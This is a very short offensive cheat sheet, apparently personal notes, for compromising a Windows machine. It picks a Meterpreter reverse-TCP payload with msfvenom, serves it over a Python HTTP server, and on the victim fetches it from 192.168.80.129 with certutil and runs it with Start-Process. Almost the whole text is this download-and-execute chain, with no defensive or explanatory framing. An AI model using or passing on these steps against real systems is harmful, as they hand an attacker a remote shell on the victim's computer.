### Using MSF Venom Generate a simple payload

```-p windows/x64/meterpreter_reverse_tcp ```

### Set up an http.server and use PS on victim to download payload

```python3 http.server [port-number]```

```certutil -urlcache -split -f http://192.168.80.129:8000/test.exe```

```Start-Process test.exe```